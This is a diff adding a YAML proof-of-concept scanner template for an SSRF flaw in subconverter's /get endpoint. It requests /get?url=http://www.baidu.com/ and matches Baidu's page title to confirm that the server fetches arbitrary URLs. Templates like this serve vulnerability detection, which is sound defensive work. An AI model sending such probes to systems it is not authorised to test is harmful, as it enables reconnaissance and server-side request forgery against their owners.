@@ -1,0 +1,15 @@
+id: poc-yaml-subconverter-get-ssrf
+info:
+  name: subconverter /get SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: subconverter
+requests:
+- method: GET
+  path: /get?url=http://www.baidu.com/
+  expression: 'status_code == 200 && contains(body, "<title>百度一下，你就知道</title>")
+
+    '
+variables: {}
+transport: http
